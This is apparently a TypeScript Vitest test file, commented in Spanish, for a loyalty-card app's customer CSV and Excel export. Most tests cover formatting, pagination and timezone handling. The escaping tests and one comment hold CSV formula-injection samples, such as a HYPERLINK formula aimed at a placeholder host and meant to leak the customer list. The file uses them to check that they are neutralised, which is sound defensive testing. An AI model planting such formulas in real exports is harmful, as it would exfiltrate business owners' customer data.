import { describe, it, expect, afterEach, vi } from 'vitest';
import type { SupabaseClient } from '@supabase/supabase-js';
import type { Database } from '../supabase/types';
import { createServiceClient } from '../supabase/server';
import { crearEntorno, type ActividadSembrada } from '../../test/fixtures/entornoComercio';
import { crearPrograma } from './programas';
import { renovarMembresia } from '../tarjetas/vigencia';
import {
  escaparCelda,
  generarCsv,
  filasParaExportar,
  hojaClientesExcel,
  type FilaExportacion,
} from './exportarClientes';

// Dos mitades: el formateador PURO (lo que rompe un CSV en la práctica) y el RECORRIDO contra la
// base, que es donde se decide en qué unidad va cada saldo. La segunda existe porque la primera,
// sola, pasaba en verde con la consulta mandando el entero crudo — ver el comentario de su bloque.
//
// Los CUATRO defectos del export (plan 2026-09-23, Tarea 6; spec §6), al final del archivo: la
// consulta de tarjetas no paginaba (PostgREST corta en 1000 sin avisar), las visitas salían de
// reporte_top_clientes (que también se cortaba en 1000), su error se ignoraba (visitas en 0 en
// silencio) y "Cliente desde" era el día UTC y no el del comercio.
//
// MUTATION-TESTING de la Tarea 6: ver el encabezado del bloque "Los cuatro defectos", abajo.

describe('escaparCelda', () => {
  it('neutraliza las celdas que Excel ejecutaría como fórmula', () => {
    // CSV injection. El archivo lo abre el DUEÑO en su computadora, confiando en él, así que una
    // celda como =HYPERLINK("http://malo/"&A1) convierte su propio export en un exfiltrador de su
    // base de clientes. El apóstrofo le dice a Excel "esto es texto" y no se muestra.
    expect(escaparCelda('=1+1')).toBe('"\'=1+1"');
    expect(escaparCelda('=HYPERLINK("http://malo/")')).toBe('"\'=HYPERLINK(""http://malo/"")"');
    expect(escaparCelda('+34600000000')).toBe('"\'+34600000000"');
    expect(escaparCelda('-2')).toBe('"\'-2"');
    expect(escaparCelda('@usuario')).toBe('"\'@usuario"');
  });

  it('no toca un nombre normal', () => {
    expect(escaparCelda('José Pérez')).toBe('"José Pérez"');
  });

  it('duplica las comillas dobles, como manda RFC 4180', () => {
    expect(escaparCelda('Juan "el Flaco"')).toBe('"Juan ""el Flaco"""');
  });

  it('entrecomilla siempre, aunque no haya comas', () => {
    // Un campo entrecomillado de más es válido; uno de menos corre TODAS las columnas cuando el
    // nombre trae una coma. Se prefiere el error inofensivo.
    expect(escaparCelda('Ana')).toBe('"Ana"');
    expect(escaparCelda('Pérez, Ana')).toBe('"Pérez, Ana"');
  });

  it('sobrevive a saltos de línea dentro de un campo', () => {
    expect(escaparCelda('linea1\nlinea2')).toBe('"linea1\nlinea2"');
  });

  it('trata null, undefined y vacío como celda vacía', () => {
    expect(escaparCelda(null)).toBe('""');
    expect(escaparCelda(undefined)).toBe('""');
    expect(escaparCelda('')).toBe('""');
  });

  it('convierte números sin marcarlos como peligrosos', () => {
    expect(escaparCelda(0)).toBe('"0"');
    expect(escaparCelda(42)).toBe('"42"');
    // Un número NEGATIVO sí empieza con '-', así que se escapa. Es feo pero correcto: preferimos un
    // apóstrofo visible en un caso rarísimo (un saldo negativo no debería existir) antes que dejar
    // pasar el vector.
    expect(escaparCelda(-1)).toBe('"\'-1"');
  });
});

describe('generarCsv', () => {
  it('arma encabezado y filas separados por CRLF', () => {
    // CRLF y no LF: es lo que dice RFC 4180 y lo que Excel en Windows espera.
    const csv = generarCsv([
      { nombre: 'Ana', apellido: 'Rivera', telefono: '+50377771234', tarjeta: 'Principal', saldo: '3 sellos', visitas: 5, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas).toHaveLength(2);
    // "Apellido" en su propia columna, justo después de "Nombre" (0036). Aparte y no unido al nombre:
    // el dueño que ordena o filtra la hoja por apellido necesita la columna sola.
    // "Visitas (todas sus tarjetas)" desde el 2026-09-24 (spec 2026-09-23 §6): las visitas son del
    // CLIENTE en el comercio y se repiten en cada una de sus tarjetas; sumar la columna duplica.
    expect(lineas[0]).toBe(
      '"Nombre","Apellido","Teléfono","Tarjeta","Saldo","Visitas (todas sus tarjetas)","Cliente desde"',
    );
    // El teléfono sale con apóstrofo, y eso es CORRECTO, no un efecto colateral: todo teléfono
    // canónico empieza con '+' y cae en el escape. En Excel y Google Sheets el apóstrofo inicial es
    // un marcador de "esto es texto" que NO se muestra — y es justamente lo que evita que Excel
    // convierta +50377771234 en el número 50377771234 y se coma el signo. Sin él, la columna más
    // importante del export llegaría mutilada.
    expect(lineas[1]).toBe(`"Ana","Rivera","'+50377771234","Principal","3 sellos","5","2026-07-01"`);
  });

  it('un cliente sin apellido deja la celda vacía, sin correr las columnas', () => {
    // Todo cliente registrado antes de la 0036 tiene el apellido en null. La celda vacía mantiene
    // el teléfono bajo "Teléfono".
    const csv = generarCsv([
      { nombre: 'Ana López', apellido: '', telefono: '+50377771234', tarjeta: 'Principal', saldo: '3 sellos', visitas: 5, alta: '2026-07-01' },
    ]);
    expect(csv.split('\r\n')[1]).toBe(`"Ana López","","'+50377771234","Principal","3 sellos","5","2026-07-01"`);
  });

  it('con cero clientes deja solo el encabezado', () => {
    // Un archivo vacío del todo le haría pensar al dueño que la descarga falló.
    expect(generarCsv([]).split('\r\n')).toHaveLength(1);
  });

  it('una fila con una coma en el nombre no corre las columnas', () => {
    const csv = generarCsv([
      { nombre: 'Pérez, Ana', apellido: 'Gómez, hija', telefono: '+50370000000', tarjeta: 'Principal', saldo: '1 sello', visitas: 1, alta: '2026-07-01' },
    ]);
    // Siete campos entrecomillados: si el escape fallara, el nombre y el apellido partirían la fila
    // en nueve.
    expect(csv.split('\r\n')[1].match(/","/g)).toHaveLength(6);
  });
});

// La lista en .xlsx (spec 2026-09-23 §6): las MISMAS filas y columnas que el CSV, pero con tipos de
// Excel. La ida y vuelta con el archivo real (read-excel-file y el zip) está en la prueba de la ruta,
// app/comercio/(protegido)/clientes/exportar/route.test.ts; acá, la estructura que se le entrega a
// write-excel-file.
describe('hojaClientesExcel', () => {
  const ana: FilaExportacion = {
    nombre: 'Ana',
    apellido: '',
    telefono: '+50377771234',
    tarjeta: 'Sellos del café',
    saldo: '3 sellos',
    visitas: 5,
    alta: '2026-03-10',
  };

  it('una hoja "Clientes" con los encabezados del CSV, en negrita y con la primera fila fija', () => {
    const hoja = hojaClientesExcel([ana]);
    expect(hoja.sheet).toBe('Clientes');
    expect(hoja.stickyRowsCount).toBe(1);
    expect(hoja.data[0]).toEqual(
      ['Nombre', 'Apellido', 'Teléfono', 'Tarjeta', 'Saldo', 'Visitas (todas sus tarjetas)', 'Cliente desde'].map(
        (titulo) => ({ value: titulo, type: String, fontWeight: 'bold' }),
      ),
    );
    // Un ancho por columna: si faltara uno, write-excel-file correría los de las siguientes.
    expect(hoja.columns).toHaveLength(7);
  });

  it('Visitas es un NÚMERO, "Cliente desde" una fecha de Excel y el teléfono texto con formato "@"', () => {
    const [, fila] = hojaClientesExcel([ana]).data;
    expect(fila).toEqual([
      { value: 'Ana', type: String },
      // Sin apellido (los clientes anteriores a la 0036): celda VACÍA, no un texto vacío.
      null,
      // Texto y "@": sin el formato, Excel reinterpreta la cadena de dígitos como número.
      { value: '+50377771234', type: String, format: '@' },
      { value: 'Sellos del café', type: String },
      { value: '3 sellos', type: String },
      { value: 5, type: Number },
      // El día ya es LOCAL del comercio (lo resolvió filasParaExportar): acá solo se arma en UTC, que
      // es lo que write-excel-file convierte a número de serie (ver lib/reportes/fechaExcel.ts).
      { value: new Date(Date.UTC(2026, 2, 10)), type: Date, format: 'dd/mm/yyyy' },
    ]);
  });

  it('sin clientes, solo el encabezado', () => {
    // Igual que el CSV: un archivo sin nada le haría pensar al dueño que la descarga falló.
    expect(hojaClientesExcel([]).data).toHaveLength(1);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// La unidad y el programa en el CSV (2026-08-07)
// ─────────────────────────────────────────────────────────────────────────────
// El export mandaba `puntos_actuales` crudo bajo una columna llamada "Saldo", sin unidad. Es el
// mismo defecto que ya se cerró en el pase, el escáner, los reportes y el portal — pero acá el
// archivo lo abre el DUEÑO en su computadora y toma decisiones de negocio con él.
describe('el CSV dice en qué moneda está cada saldo', () => {
  it('un saldo en dinero se lee en dólares, no como un entero pelado', () => {
    // 1250 en la columna son $12.50. Exportar "1250" bajo el título "Saldo" no es ambiguo: es
    // falso, y por un factor de cien.
    const csv = generarCsv([
      { nombre: 'Ana', apellido: 'Rivera', telefono: '+50377771234', tarjeta: 'Gift card', saldo: '$12.50', visitas: 2, alta: '2026-07-01' },
    ]);
    expect(csv.split('\r\n')[1]).toContain('$12.50');
  });

  it('cada fila dice a QUÉ tarjeta pertenece', () => {
    // Un comercio puede tener dos programas activos a la vez. Sin esta columna, la fila de alguien
    // con 8 sellos y la de alguien con $8.00 de saldo se ven idénticas en la hoja de cálculo.
    const csv = generarCsv([
      { nombre: 'Ana', apellido: 'Rivera', telefono: '+50377771234', tarjeta: 'Sellos del café', saldo: '8 sellos', visitas: 8, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas[0]).toContain('Tarjeta');
    expect(lineas[1]).toContain('Sellos del café');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// El RECORRIDO, contra la base real
// ─────────────────────────────────────────────────────────────────────────────
// Las pruebas de arriba son del formateador puro y NO alcanzan: se las alimenta con un saldo ya
// formateado, así que pasan igual aunque `filasParaExportar` mande el entero crudo. Se comprobó con
// una mutación —reemplazar describirCosto por String(puntos_actuales) las dejó las 12 en verde— y
// por eso existe este bloque. El defecto vive en la CONSULTA, no en el formateador.
describe('filasParaExportar (contra la base)', () => {
  const supabase = createServiceClient();
  const entorno = crearEntorno(supabase);

  afterEach(async () => {
    await entorno.limpiar();
  });

  it('un saldo en centavos sale en dólares, y la fila dice de qué tarjeta es', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'gift_card' });
    // 1250 en la columna son $12.50.
    await entorno.crearTarjeta(comercioId, 1250);

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas).toHaveLength(1);
    // "disponibles" y no "$12.50" a secas desde el 2026-09-08: el saldo lo arma `describirFila`,
    // el MISMO formateador que ve el cliente en su billetera y el dueño en Clientes. Que el CSV
    // hable distinto que la pantalla es justo lo que hace dudar de cuál de los dos miente.
    expect(filas![0].saldo, 'exportó el entero crudo: $12.50 se lee como 1250').toBe('$12.50 disponibles');
    expect(filas![0].tarjeta.length, 'la fila no dice a qué tarjeta pertenece').toBeGreaterThan(0);
  });

  it('en sellos sale contado en sellos', async () => {
    // La otra mitad: si TODO saliera formateado como dinero, la prueba de arriba pasaría igual.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    await entorno.crearTarjeta(comercioId, 8);

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas![0].saldo).toBe('8 sellos');
  });

  it('el apellido sale en su columna, y vacío en un cliente que no lo tiene', async () => {
    // Por el recorrido y no por `generarCsv`: la prueba del encabezado pasa aunque la CONSULTA no
    // traiga el apellido, porque se la alimenta con la fila ya armada.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    const { id: conApellido } = await entorno.crearTarjeta(comercioId, 1);
    await entorno.crearTarjeta(comercioId, 2);
    // El fixture crea clientes sin apellido (como los anteriores a la 0036); a uno se le pone acá.
    // El registro que lo guarda al crear el cliente es de otra tarea y tiene sus propias pruebas.
    const { data: tarjeta, error: eT } = await supabase
      .from('tarjetas')
      .select('cliente_id')
      .eq('id', conApellido)
      .single();
    if (eT) throw eT;
    const { error: eU } = await supabase.from('clientes').update({ apellido: 'Rivera' }).eq('id', tarjeta.cliente_id);
    if (eU) throw eU;

    const filas = await filasParaExportar(supabase, comercioId);

    // MUTACIÓN (2026-09-17): sacar `apellido` del select de `filasParaExportar` (dejándolo en
    // `clientes(nombre, telefono)`) hace fallar esta prueba con
    // "expected [ '', '' ] to deeply equal [ '', 'Rivera' ]": la columna sale vacía para todos
    // aunque el cliente tenga apellido.
    // Ordenado y no por posición: las dos tarjetas nacen en el mismo milisegundo a veces.
    expect((filas ?? []).map((f) => f.apellido).sort()).toEqual(['', 'Rivera']);
  });

  // ───────────────────────────────────────────────────────────────────────────
  // Los tres tipos SIN contador (2026-09-08)
  // ───────────────────────────────────────────────────────────────────────────
  // El export formateaba el saldo con `describirCosto`, que está pensada para COSTOS y devuelve
  // cadena VACÍA cuando el tipo no cuenta enteros (cupón, membresía y descuento: su estado es una
  // fecha o un nivel, no un número). O sea que el dueño de un gimnasio descargaba su base y la
  // columna "Saldo" venía vacía para TODOS sus socios — justo el dato por el que abre el archivo.
  //
  // El arreglo es el mismo de siempre: `describirFila` + `COLUMNAS_ESTADO`, que viajan juntas para
  // que el `select` no pueda quedarse corto (le faltaban vigencia_hasta, usado_en y
  // acumulado_centavos).
  it('una membresía exporta hasta cuándo está activa, no una celda vacía', async () => {
    // La configuración se carga con `crearPrograma()` —la MISMA función que usa la pantalla
    // Programas— y el comercio queda con sus columnas legadas vacías. Es la única forma de que la
    // prueba mida lo que vive el dueño (ver el encabezado de lib/tarjetas/tiposFuncionales.test.ts).
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    const programa = await crearPrograma(supabase, comercioId, {
      nombre: 'Socios',
      tipoTarjeta: 'membresia',
      cashbackPorcentaje: null,
      multipassVisitas: null,
      membresiaDias: 30,
      cuponVigenciaDias: null,
    });
    if (!programa.ok) throw new Error(`no se pudo crear el programa de membresía: ${programa.error}`);
    const { id: tarjetaId } = await entorno.crearTarjeta(comercioId, 0, { programaId: programa.id });
    // La vigencia la escribe el camino de PRODUCCIÓN (el RPC de renovación), no un insert a mano:
    // así la fecha que termina en el CSV es la misma que ve el socio en su billetera.
    const renovacion = await renovarMembresia(supabase, comercioId, tarjetaId);
    expect(renovacion.ok, renovacion.ok ? '' : renovacion.error).toBe(true);

    const filas = await filasParaExportar(supabase, comercioId);
    const fila = (filas ?? []).find((f) => f.tarjeta === 'Socios');

    // MUTACIÓN (2026-09-08): volver la línea del saldo de `filasParaExportar` a
    // `describirCosto(programa?.tipoTarjeta ?? 'puntos', t.puntos_actuales)` deja esta celda VACÍA
    // y esta prueba falla con "expected '' to match /^Activa hasta el /". Es exactamente la línea
    // que la prueba dice proteger.
    expect(
      fila?.saldo,
      'la columna Saldo salió vacía: el socio no sabe hasta cuándo está activo',
    ).toMatch(/^Activa hasta el /);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Los cuatro defectos (plan 2026-09-23, Tarea 6; spec §6), contra la base
// ─────────────────────────────────────────────────────────────────────────────
// El tamaño de página se INYECTA (2) para ver con cinco tarjetas lo que en producción pasa con más de
// 1000: sin paginar, PostgREST devuelve la primera página y nada avisa que había más.
//
// Las fallas se provocan con un cliente de Supabase REAL al que se le cambia UNA puerta (clienteCon):
// todo lo demás va a la base, así que la prueba recorre el mismo camino que producción y lo único
// distinto es la lectura que falla. Contra la base real no se puede provocar un error de una RPC.
//
// MUTATION-TESTING (corridas el 2026-09-24 sobre el código en verde, con el mensaje que se vio caer):
// - El corte de la paginación, TARJETAS: solo la primera página (`if (inicio > 0) return []`, lo que
//   hacía el max-rows de PostgREST): caen 2, "con páginas de 2…" con `faltan tarjetas o salieron en
//   otro orden: expected [ '+503…', …(1) ] to deeply equal [ '+503…', …(4) ]` y la del tope de
//   tarjetas con `expected [] to be null`.
// - El corte de la paginación, VISITAS: reporteClientes en modo 'pagina' (UNA página, como el
//   reporte_top_clientes de antes): caen 2, "con páginas de 2…" con `una tarjeta perdió sus visitas:
//   expected [ 5, +0, 4, +0, +0 ] to deeply equal [ 5, 3, 4, 1, 2 ]` y la del tope de clientes.
// - Sin `.range()` en las tarjetas: cae "con páginas de 2…" por timeout (20 s): cada página vuelve
//   llena con las mismas filas y el bucle no corta hasta el tope.
// - Sin el desempate `.order('id')`: cae "con páginas de 2…" con `faltan tarjetas o salieron en otro
//   orden` (3 de 3 corridas). Con DOS empatados dentro de una misma página sobrevivía: por eso son
//   cuatro, cruzando dos cortes.
// - Ignorar el error de las visitas (todas en 0, como antes): cae "si falla la lectura de las
//   visitas…" con `exportó con las visitas en 0 aunque no se pudieron leer: expected [ { nombre:
//   'Cliente Prueba', …(6) } ] to be null`.
// - Ignorar el error de las tarjetas (`return []`): cae "si falla la lectura de las tarjetas…" con
//   `expected [] to be null`.
// - La fecha en UTC (`created_at.slice(0, 10)`): caen 3; acá "Cliente desde…" con `expected [
//   '2026-03-11', '2026-03-11' ] to deeply equal [ '2026-03-10', '2026-03-11' ]`, y las dos de la ruta
//   (CSV y .xlsx).
// - La zona de El Salvador fija en vez de la del comercio: cae "Cliente desde…" con `expected [
//   '2026-03-10', '2026-03-10' ] to deeply equal [ '2026-03-10', '2026-03-11' ]` (la SEGUNDA tarjeta: la
//   primera da el mismo día en las dos zonas).
// - El teléfono sin '@' (celda de texto pelada): cae "Visitas es un NÚMERO…" con `expected [ { value:
//   'Ana', …(1) }, null, …(5) ] to deeply equal [ { value: 'Ana', …(1) }, null, …(5) ]`, y la del zip
//   de la ruta con `expected null to be '@'`.
// - Sin el tope de tarjetas: cae la suya con `exportó una lista cortada en el tope: expected [] to be
//   null`. Sin el de visitas: cae la suya con `exportó con visitas en 0 para los clientes fuera del
//   tope: expected [ { nombre: 'Cliente Prueba', …(6) } ] to be null`.
// - Suponer El Salvador si falla la lectura de la zona: cae "si falla la lectura de la zona…" con
//   `exportó con una zona supuesta: expected [ { nombre: 'Cliente Prueba', …(6) } ] to be null`.
describe('filasParaExportar: los cuatro defectos (contra la base)', () => {
  const supabase = createServiceClient();
  const entorno = crearEntorno(supabase);

  afterEach(async () => {
    vi.restoreAllMocks();
    await entorno.limpiar();
  });

  // El error con la forma de PostgREST (PostgrestError).
  const FALLA = { message: 'falla simulada', code: 'XX000', details: '', hint: '' };

  // Un cliente REAL con una o más puertas cambiadas: una RPC o una tabla. Lo que no se cambia, va a la
  // base con el cliente real (`this` incluido).
  function clienteCon(
    real: SupabaseClient<Database>,
    cambios: {
      rpc?: Record<string, (args: Record<string, unknown>) => unknown>;
      tablas?: Record<string, () => unknown>;
    },
  ): SupabaseClient<Database> {
    return new Proxy(real, {
      get(objetivo, prop) {
        if (prop === 'rpc') {
          return (funcion: string, args: Record<string, unknown>) =>
            cambios.rpc?.[funcion]?.(args) ??
            (objetivo.rpc as unknown as (f: string, a: unknown) => unknown).call(objetivo, funcion, args);
        }
        if (prop === 'from') {
          return (tabla: string) =>
            cambios.tablas?.[tabla]?.() ??
            (objetivo.from as unknown as (t: string) => unknown).call(objetivo, tabla);
        }
        const valor: unknown = Reflect.get(objetivo, prop);
        return typeof valor === 'function' ? valor.bind(objetivo) : valor;
      },
    });
  }

  // Una consulta falsa encadenable (.select().eq().order().range(), o .maybeSingle()) que responde lo
  // que se le diga para cada rango. Si filasParaExportar llamara un método que esta no tiene, la prueba
  // revienta con un TypeError a la vista: nunca pasa en verde por casualidad.
  function consultaFalsa(responder: (inicio: number, fin: number) => { data: unknown; error: unknown }) {
    let rango: [number, number] = [0, 0];
    const cadena = {
      select: () => cadena,
      eq: () => cadena,
      maybeSingle: () => cadena,
      order: () => cadena,
      range: (inicio: number, fin: number) => {
        rango = [inicio, fin];
        return cadena;
      },
      then: (ok: (v: unknown) => unknown, mal: (e: unknown) => unknown) =>
        Promise.resolve(responder(rango[0], rango[1])).then(ok, mal),
    };
    return cadena;
  }

  async function telefonosDe(clienteIds: string[]): Promise<Map<string, string>> {
    const { data, error } = await supabase.from('clientes').select('id, telefono').in('id', clienteIds);
    if (error) throw error;
    return new Map(data.map((c) => [c.id, c.telefono]));
  }

  function visitas(tarjetaId: string, cuantas: number): ActividadSembrada[] {
    return Array.from({ length: cuantas }, () => ({
      clase: 'visita' as const,
      tarjetaId,
      createdAt: '2026-03-20T12:00:00-06:00',
    }));
  }

  it('con páginas de 2, las 5 tarjetas salen TODAS, en orden (created_at, id), cada una con sus visitas', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    // CUATRO nacen en el mismo instante y la más vieja se crea AL FINAL: el orden del archivo lo decide
    // la consulta, no el orden de los inserts. Con páginas de 2 quedan [vieja, empate], [empate,
    // empate], [empate]: el empate cruza dos cortes de página, y solo el desempate por id lo ordena
    // igual en cada consulta. Sin él, que los cuatro salgan justo en orden de id por casualidad tiene
    // una chance en 24 (con dos empatados dentro de una misma página, la mutación sobrevivía).
    const nacimientos = [
      '2026-03-03T10:00:00-06:00',
      '2026-03-03T10:00:00-06:00',
      '2026-03-03T10:00:00-06:00',
      '2026-03-03T10:00:00-06:00',
      '2026-03-01T10:00:00-06:00',
    ];
    const tarjetas: { id: string; clienteId: string; createdAt: string; visitas: number }[] = [];
    for (const [i, createdAt] of nacimientos.entries()) {
      const { id, clienteId } = await entorno.crearTarjeta(comercioId, 0, { createdAt });
      // Visitas distintas por tarjeta (1 a 5): una fila con las visitas de otra se vería.
      tarjetas.push({ id, clienteId, createdAt, visitas: i + 1 });
    }
    await entorno.sembrarActividad(tarjetas.flatMap((t) => visitas(t.id, t.visitas)));
    const telefono = await telefonosDe(tarjetas.map((t) => t.clienteId));

    const filas = await filasParaExportar(supabase, comercioId, { tamanoPagina: 2 });

    const esperadas = [...tarjetas].sort(
      (a, b) => Date.parse(a.createdAt) - Date.parse(b.createdAt) || (a.id < b.id ? -1 : 1),
    );
    expect(filas?.map((f) => f.telefono), 'faltan tarjetas o salieron en otro orden').toEqual(
      esperadas.map((t) => telefono.get(t.clienteId)),
    );
    expect(filas?.map((f) => f.visitas), 'una tarjeta perdió sus visitas').toEqual(esperadas.map((t) => t.visitas));
  });

  it('"Cliente desde" es el día LOCAL del comercio: las 23:30 del 10 en Bogotá dicen 10, no 11', async () => {
    // Bogotá (UTC−5) y no El Salvador: con la zona de la PC de Daniel (UTC−6), un código que usara el
    // reloj del proceso pasaría acá y fallaría en Vercel (UTC).
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos', zona_horaria: 'America/Bogota' });
    // 23:30 del 10 en Bogotá = 04:30 del 11 en UTC. La segunda, 00:30 del 11 en Bogotá = 23:30 del 10
    // en El Salvador: atrapa también la zona equivocada (no solo UTC).
    await entorno.crearTarjeta(comercioId, 0, { createdAt: '2026-03-10T23:30:00-05:00' });
    await entorno.crearTarjeta(comercioId, 0, { createdAt: '2026-03-11T00:30:00-05:00' });

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas?.map((f) => f.alta)).toEqual(['2026-03-10', '2026-03-11']);
  });

  it('si falla la lectura de las visitas, la exportación FALLA: nunca visitas en 0', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    const { id } = await entorno.crearTarjeta(comercioId, 0);
    await entorno.sembrarActividad(visitas(id, 2));
    // Control: con la base respondiendo, la fila trae sus 2 visitas. Así lo único distinto abajo es
    // la lectura que falla.
    expect((await filasParaExportar(supabase, comercioId))?.map((f) => f.visitas)).toEqual([2]);

    const errores = vi.spyOn(console, 'error').mockImplementation(() => {});
    const falla = clienteCon(supabase, {
      rpc: { reporte_clientes: () => Promise.resolve({ data: null, error: FALLA }) },
    });

    const filas = await filasParaExportar(falla, comercioId);

    expect(filas, 'exportó con las visitas en 0 aunque no se pudieron leer').toBeNull();
    expect(errores).toHaveBeenCalledWith('[reportes] falló reporte_clientes:', FALLA);
  });

  it('si falla la lectura de las tarjetas, la exportación FALLA: nunca una lista vacía', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    await entorno.crearTarjeta(comercioId, 0);

    const errores = vi.spyOn(console, 'error').mockImplementation(() => {});
    const falla = clienteCon(supabase, {
      tablas: { tarjetas: () => consultaFalsa(() => ({ data: null, error: FALLA })) },
    });

    const filas = await filasParaExportar(falla, comercioId);

    expect(filas, 'exportó una lista vacía aunque no se pudieron leer las tarjetas').toBeNull();
    expect(errores).toHaveBeenCalledWith('[exportar] falló la consulta de tarjetas:', FALLA);
  });

  it('si falla la lectura de la zona del comercio, FALLA: no supone El Salvador', async () => {
    // La zona decide el día de "Cliente desde": suponer El Salvador le correría el día a las tarjetas
    // de la última hora de un comercio de Bogotá.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos', zona_horaria: 'America/Bogota' });
    await entorno.crearTarjeta(comercioId, 0, { createdAt: '2026-03-11T00:30:00-05:00' });

    const errores = vi.spyOn(console, 'error').mockImplementation(() => {});
    const falla = clienteCon(supabase, {
      tablas: { comercios: () => consultaFalsa(() => ({ data: null, error: FALLA })) },
    });

    const filas = await filasParaExportar(falla, comercioId);

    expect(filas, 'exportó con una zona supuesta').toBeNull();
    expect(errores).toHaveBeenCalledWith('[exportar] no se pudo leer la zona horaria del comercio:', FALLA);
  });

  it('más de 50 000 tarjetas: FALLA en vez de exportar una lista cortada', async () => {
    // El tope de paginarPorRango (TOPE_FILAS) corta y lo avisa con `alcanzoTope`; el Excel de Reportes
    // lo escribe en su Resumen, pero esta lista no tiene dónde decirlo: cortada, sería el mismo defecto
    // que se arregla acá (PostgREST cortando en 1000 sin avisar), solo que más lejos.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    const errores = vi.spyOn(console, 'error').mockImplementation(() => {});
    // Páginas LLENAS siempre: la base "tiene" infinitas tarjetas.
    const infinitas = clienteCon(supabase, {
      tablas: {
        tarjetas: () =>
          consultaFalsa((inicio, fin) => ({ data: Array.from({ length: fin - inicio + 1 }, () => ({})), error: null })),
      },
    });

    const filas = await filasParaExportar(infinitas, comercioId);

    expect(filas, 'exportó una lista cortada en el tope').toBeNull();
    expect(errores).toHaveBeenCalledWith('[exportar] más de 50000 tarjetas: no se exporta una lista incompleta');
  });

  it('más de 50 000 clientes con visitas: FALLA en vez de dejar en 0 a los que quedaron afuera', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    await entorno.crearTarjeta(comercioId, 0);
    const errores = vi.spyOn(console, 'error').mockImplementation(() => {});
    // reporte_clientes que dice tener 60 000 filas y devuelve cada página llena, como la SQL.
    const muchos = clienteCon(supabase, {
      rpc: {
        reporte_clientes: (args) => {
          const offset = Number(args.p_offset);
          const limite = Number(args.p_limite);
          const data = Array.from({ length: limite }, (_, i) => ({
            cliente_id: `cliente-${offset + i}`,
            operaciones: 1,
            total: 60_000,
            offset_efectivo: offset,
          }));
          return Promise.resolve({ data, error: null });
        },
      },
    });

    const filas = await filasParaExportar(muchos, comercioId);

    expect(filas, 'exportó con visitas en 0 para los clientes fuera del tope').toBeNull();
    expect(errores).toHaveBeenCalledWith(
      '[exportar] más de 50000 clientes con actividad: no se exporta con visitas incompletas',
    );
  });
});
